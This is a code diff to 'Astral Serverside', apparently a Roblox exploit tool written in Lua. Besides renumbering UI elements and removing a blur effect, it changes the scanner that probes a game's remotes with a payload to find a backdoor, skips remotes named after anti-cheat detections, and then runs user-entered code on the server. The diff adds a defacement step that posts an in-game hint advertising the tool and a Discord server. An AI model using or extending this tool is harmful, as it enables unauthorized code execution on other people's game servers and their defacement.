 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Corner
-ASTRAL["3e"] = Instance.new("UICorner", ASTRAL["10"]);
-ASTRAL["3e"]["Name"] = [[Corner]];
-ASTRAL["3e"]["CornerRadius"] = UDim.new(0, 12);
+ASTRAL["3d"] = Instance.new("UICorner", ASTRAL["f"]);
+ASTRAL["3d"]["Name"] = [[Corner]];
+ASTRAL["3d"]["CornerRadius"] = UDim.new(0, 12);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Title
-ASTRAL["3f"] = Instance.new("TextLabel", ASTRAL["e"]);
-ASTRAL["3f"]["TextWrapped"] = true;
-ASTRAL["3f"]["TextStrokeTransparency"] = 0;
-ASTRAL["3f"]["BorderSizePixel"] = 0;
-ASTRAL["3f"]["TextSize"] = 14;
-ASTRAL["3f"]["TextScaled"] = true;
-ASTRAL["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["3f"]["BackgroundTransparency"] = 1;
-ASTRAL["3f"]["Size"] = UDim2.new(1, 0, 0, 32);
-ASTRAL["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["3f"]["Text"] = [[Astral Serverside]];
-ASTRAL["3f"]["Name"] = [[Title]];
-ASTRAL["3f"]["Position"] = UDim2.new(0, 0, 0, 10);
+ASTRAL["3e"] = Instance.new("TextLabel", ASTRAL["d"]);
+ASTRAL["3e"]["TextWrapped"] = true;
+ASTRAL["3e"]["TextStrokeTransparency"] = 0;
+ASTRAL["3e"]["BorderSizePixel"] = 0;
+ASTRAL["3e"]["TextSize"] = 14;
+ASTRAL["3e"]["TextScaled"] = true;
+ASTRAL["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["3e"]["BackgroundTransparency"] = 1;
+ASTRAL["3e"]["Size"] = UDim2.new(1, 0, 0, 32);
+ASTRAL["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["3e"]["Text"] = [[Astral Serverside]];
+ASTRAL["3e"]["Name"] = [[Title]];
+ASTRAL["3e"]["Position"] = UDim2.new(0, 0, 0, 10);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute
-ASTRAL["40"] = Instance.new("TextButton", ASTRAL["e"]);
-ASTRAL["40"]["TextStrokeTransparency"] = 0;
-ASTRAL["40"]["BorderSizePixel"] = 0;
-ASTRAL["40"]["TextSize"] = 24;
-ASTRAL["40"]["AutoButtonColor"] = false;
-ASTRAL["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["40"]["AnchorPoint"] = Vector2.new(0.5, 0);
-ASTRAL["40"]["BackgroundTransparency"] = 1;
-ASTRAL["40"]["Size"] = UDim2.new(1, -50, 0, 30);
-ASTRAL["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["40"]["Text"] = [[Execute]];
-ASTRAL["40"]["Name"] = [[Execute]];
-ASTRAL["40"]["Position"] = UDim2.new(0.5, 0, 0, 235);
+ASTRAL["3f"] = Instance.new("TextButton", ASTRAL["d"]);
+ASTRAL["3f"]["TextStrokeTransparency"] = 0;
+ASTRAL["3f"]["BorderSizePixel"] = 0;
+ASTRAL["3f"]["TextSize"] = 24;
+ASTRAL["3f"]["AutoButtonColor"] = false;
+ASTRAL["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["3f"]["AnchorPoint"] = Vector2.new(0.5, 0);
+ASTRAL["3f"]["BackgroundTransparency"] = 1;
+ASTRAL["3f"]["Size"] = UDim2.new(1, -50, 0, 30);
+ASTRAL["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["3f"]["Text"] = [[Execute]];
+ASTRAL["3f"]["Name"] = [[Execute]];
+ASTRAL["3f"]["Position"] = UDim2.new(0.5, 0, 0, 235);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border
-ASTRAL["41"] = Instance.new("UIStroke", ASTRAL["40"]);
-ASTRAL["41"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-ASTRAL["41"]["Name"] = [[Border]];
-ASTRAL["41"]["Color"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["40"] = Instance.new("UIStroke", ASTRAL["3f"]);
+ASTRAL["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+ASTRAL["40"]["Name"] = [[Border]];
+ASTRAL["40"]["Color"] = Color3.fromRGB(255, 255, 255);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow
-ASTRAL["42"] = Instance.new("UIGradient", ASTRAL["41"]);
-ASTRAL["42"]["Name"] = [[Rainbow]];
-ASTRAL["42"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};
+ASTRAL["41"] = Instance.new("UIGradient", ASTRAL["40"]);
+ASTRAL["41"]["Name"] = [[Rainbow]];
+ASTRAL["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
-ASTRAL["43"] = Instance.new("LocalScript", ASTRAL["42"]);
-ASTRAL["43"]["Name"] = [[Rotation]];
+ASTRAL["42"] = Instance.new("LocalScript", ASTRAL["41"]);
+ASTRAL["42"]["Name"] = [[Rotation]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Corner
-ASTRAL["44"] = Instance.new("UICorner", ASTRAL["40"]);
-ASTRAL["44"]["Name"] = [[Corner]];
-ASTRAL["44"]["CornerRadius"] = UDim.new(0, 12);
+ASTRAL["43"] = Instance.new("UICorner", ASTRAL["3f"]);
+ASTRAL["43"]["Name"] = [[Corner]];
+ASTRAL["43"]["CornerRadius"] = UDim.new(0, 12);
 
 
 -- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
@@ -704,177 +699,9 @@ local script = ASTRAL["6"];
 	end
 end;
 task.spawn(C_6);
--- StarterGui.Astral Serverside.MainFrame.Blur
+-- StarterGui.Astral Serverside.MainFrame.Drag
 local function C_7()
 local script = ASTRAL["7"];
-	--# This was NOT created by me, this was created by @ImSnox (thanks)
-	
-	if script.Parent.Parent.Enabled ~= true then return end
-	
-	local Lighting          = game:GetService("Lighting")
-	local camera			= workspace.CurrentCamera
-	
-	local BLUR_SIZE         = Vector2.new(0, 0)
-	local PART_SIZE         = 0.01
-	local PART_TRANSPARENCY = 1 - 1e-7
-	local START_INTENSITY	= 0.25
-	
-	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
-	
-	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
-	BLUR_OBJ.FarIntensity   = 0
-	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
-	BLUR_OBJ.FocusDistance  = 0.25
-	BLUR_OBJ.InFocusRadius  = 0
-	BLUR_OBJ.Parent         = Lighting
-	
-	local PartsList         = {}
-	local BlursList         = {}
-	local BlurObjects       = {}
-	local BlurredGui        = {}
-	
-	BlurredGui.__index      = BlurredGui
-	
-	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
-		local n = planeNormal
-		local d = rayDirection
-		local v = rayOrigin - planePos
-	
-		local num = n.x*v.x + n.y*v.y + n.z*v.z
-		local den = n.x*d.x + n.y*d.y + n.z*d.z
-		local a = -num / den
-	
-		return rayOrigin + a * rayDirection, a
-	end
-	
-	function rebuildPartsList()
-		PartsList = {}
-		BlursList = {}
-		for blurObj, part in pairs(BlurObjects) do
-			table.insert(PartsList, part)
-			table.insert(BlursList, blurObj)
-		end
-	end
-	
-	function BlurredGui.new(frame, shape)
-		local blurPart        = Instance.new("Part")
-		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
-		blurPart.Anchored     = true
-		blurPart.CanCollide   = false
-		blurPart.CanTouch     = false
-		blurPart.Material     = Enum.Material.Glass
-		blurPart.Transparency = PART_TRANSPARENCY
-		blurPart.Parent       = workspace.CurrentCamera
-	
-		local mesh
-		if (shape == "Rectangle") then
-			mesh        = Instance.new("BlockMesh")
-			mesh.Parent = blurPart
-		elseif (shape == "Oval") then
-			mesh          = Instance.new("SpecialMesh")
-			mesh.MeshType = Enum.MeshType.Sphere
-			mesh.Parent   = blurPart
-		end
-		
-		local ignoreInset = false
-		local currentObj  = frame
-		
-		while true do
-			currentObj = currentObj.Parent
-	
-			if (currentObj and currentObj:IsA("ScreenGui")) then
-				ignoreInset = currentObj.IgnoreGuiInset
-				break
-			elseif (currentObj == nil) then
-				break
-			end
-		end
-	
-		local new = setmetatable({
-			Frame          = frame;
-			Part           = blurPart;
-			Mesh           = mesh;
-			IgnoreGuiInset = ignoreInset;
-		}, BlurredGui)
-	
-		BlurObjects[new] = blurPart
-		rebuildPartsList()
-	
-		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
-			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
-			BlurredGui.updateAll()
-		end)
-		return new
-	end
-	
-	function updateGui(blurObj)
-		if (not blurObj.Frame.Visible) then
-			blurObj.Part.Transparency = 1
-			return
-		end
-		
-		local camera = workspace.CurrentCamera
-		local frame  = blurObj.Frame
-		local part   = blurObj.Part
-		local mesh   = blurObj.Mesh
-		
-		part.Transparency = PART_TRANSPARENCY
-		
-		local corner0 = frame.AbsolutePosition + BLUR_SIZE
-		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
-		local ray0, ray1
-	
-		if (blurObj.IgnoreGuiInset) then
-			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
-			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
-		else
-			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
-			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
-		end
-	
-		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
-		local planeNormal = camera.CFrame.LookVector
-		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
-		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
-	
-		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
-		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
-	
-		local size   = pos1 - pos0
-		local center = (pos0 + pos1)/2
-	
-		mesh.Offset = center
-		mesh.Scale  = size / PART_SIZE
-	end
-	
-	function BlurredGui.updateAll()
-		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
-		
-		for i = 1, #BlursList do
-			updateGui(BlursList[i])
-		end
-	
-		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
-		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
-	
-		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
-	end
-	
-	function BlurredGui:Destroy()
-		self.Part:Destroy()
-		BlurObjects[self] = nil
-		rebuildPartsList()
-	end
-	
-	BlurredGui.new(script.Parent, "Rectangle")
-	
-	BlurredGui.updateAll()
-	return BlurredGui
-end;
-task.spawn(C_7);
--- StarterGui.Astral Serverside.MainFrame.Drag
-local function C_8()
-local script = ASTRAL["8"];
 	local dragging, dragstart, startpos
 	script.Parent.InputBegan:Connect(function(input)
 		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
@@ -891,10 +718,10 @@ local script = ASTRAL["8"];
 		end
 	end)
 end;
-task.spawn(C_8);
+task.spawn(C_7);
 -- StarterGui.Astral Serverside.MainFrame.ScanningHandler
-local function C_d()
-local script = ASTRAL["d"];
+local function C_c()
+local script = ASTRAL["c"];
 	--= Info =--
 	local mainframe = script.Parent
 	local scanningframe = mainframe:WaitForChild("ScanningFrame",3)
@@ -903,6 +730,7 @@ local script = ASTRAL["d"];
 	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
 	local vulnremote: RemoteEvent | RemoteFunction = nil
 	local backdoored: boolean = false
+	local credithint: boolean = true -- Just to give me credit for making Astral :3
 	
 	--= Setup =--
 	scanningframe.Visible = true
@@ -966,18 +794,18 @@ local script = ASTRAL["d"];
 	local timer: number = 0
 	coroutine.wrap(function()
 		repeat
-			timer += 0.01
+			timer += 0.001
 			task.wait(0.01)
 		until backdoored
 	end)()
 	
 	local function checkpayload(remote: RemoteEvent | RemoteFunction)
 		fire(remote,payload)
-		for i = 1,32 do
+		for i = 1,320 do
 			if game:GetService("SoundService"):FindFirstChild(testpartname) then
 				return true
 			end
-			task.wait(0.01)
+			task.wait(0.001)
 		end
 		return false
 	end
@@ -1001,6 +829,7 @@ local script = ASTRAL["d"];
 	end
 	
 	if backdoored and vulnremote then
+		if credithint then fire(vulnremote,[[Instance.new("Hint",workspace).Text="This game was backdoored with: Astral SS  |  Join StrawberryCMD .gg/bXQfb3QWa8"]]) end
 		notify("Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
 		scanningframe:FindFirstChild("Description").Text = "Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer).."\nLoading execution panel..."
 		coroutine.wrap(function()
@@ -1026,10 +855,10 @@ local script = ASTRAL["d"];
 		fire(vulnremote,code)
 	end)
 end;
-task.spawn(C_d);
+task.spawn(C_c);
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
-local function C_1b()
-local script = ASTRAL["1b"];
+local function C_1a()
+local script = ASTRAL["1a"];
 	--# FastColoredTextBox v3 by: C:\Drive
 	
 	local fctbelements = {
@@ -1329,10 +1158,10 @@ local script = ASTRAL["1b"];
 		end
 	end)
 end;
-task.spawn(C_1b);
+task.spawn(C_1a);
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
-local function C_3d()
-local script = ASTRAL["3d"];
+local function C_3c()
+local script = ASTRAL["3c"];
 	while true do
 		script.Parent.Rotation = script.Parent.Rotation + 4
 		wait()
@@ -1341,10 +1170,10 @@ local script = ASTRAL["3d"];
 		end
 	end
 end;
-task.spawn(C_3d);
+task.spawn(C_3c);
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
-local function C_43()
-local script = ASTRAL["43"];
+local function C_42()
+local script = ASTRAL["42"];
 	while true do
 		script.Parent.Rotation = script.Parent.Rotation + 4
 		wait()
@@ -1353,6 +1182,6 @@ local script = ASTRAL["43"];
 		end
 	end
 end;
-task.spawn(C_43);
+task.spawn(C_42);
 
 return ASTRAL["1"], require;
